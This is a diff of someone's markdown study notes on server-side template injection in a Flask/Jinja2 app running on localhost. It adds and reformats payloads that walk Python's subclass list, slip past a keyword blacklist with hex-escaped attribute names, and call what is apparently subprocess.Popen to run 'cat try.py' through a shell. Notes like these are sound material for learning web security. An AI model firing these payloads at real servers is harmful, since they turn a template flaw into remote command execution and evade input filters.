@@ -36,11 +36,18 @@ Now to get the index at which the urllib is present, we can copy the list and it
 {% endfor %}
 ```
 If this is our payload, then the for loop iterates through the subclasses list and prints the index wherever it finds urllib mentioned
-url encoding the block we get the payload as: ```%7B%25%20set%20subclasses%20%3D%20().__class__.__base__.__subclasses__()%20%25%7D%0A%7B%25%20for%20i%20in%20range(subclasses%7Clength)%20%25%7D%0A%20%20%7B%25%20if%20'urllib'%20in%20subclasses%5Bi%5D.__module__%20%25%7D%0A%20%20%20%20%7B%7B%20i%20%7D%7D%0A%20%20%7B%25%20endif%20%25%7D%0A%7B%25%20endfor%20%25%7D```
+url encoding the block we get the payload as: 
+PAYLOAD:
+```
+%7B%25%20set%20subclasses%20%3D%20().__class__.__base__.__subclasses__()%20%25%7D%0A%7B%25%20for%20i%20in%20range(subclasses%7Clength)%20%25%7D%0A%20%20%7B%25%20if%20'urllib'%20in%20subclasses%5Bi%5D.__module__%20%25%7D%0A%20%20%20%20%7B%7B%20i%20%7D%7D%0A%20%20%7B%25%20endif%20%25%7D%0A%7B%25%20endfor%20%25%7D
+```
 
 ![image](https://github.com/poorvi1910/Web/assets/146640913/433ab890-0a54-4476-a97c-725822933382)
 
-FOR BLACKLIST: ```http://127.0.0.1:5000/?c={{%20(dict.mro()[-1]|attr(%22\x5f\x5fsubclasses\x5f\x5f%22))()%20}}```
+FOR BLACKLIST: 
+```
+http://127.0.0.1:5000/?c={{%20(dict.mro()[-1]|attr(%22\x5f\x5fsubclasses\x5f\x5f%22))()%20}}
+```
 
 - Get name of current python flask script
 
@@ -58,6 +65,10 @@ FOR BLACKLIST: ```http://127.0.0.1:5000/?c={{%20(dict.mro()[-1]|attr(%22\x5f\x5f
 
 ![image](https://github.com/poorvi1910/Web/assets/146640913/a516db8b-213f-4e58-8650-585cac3a95de)
 
+PAYLOAD:
+```
+http://127.0.0.1:5000/?c={{().__class__.__mro__[1].__subclasses__()[568](%27cat%20try.py%27,%20shell=True,%20stdout=-1).communicate()}}
+```
 
 - Run a command
 
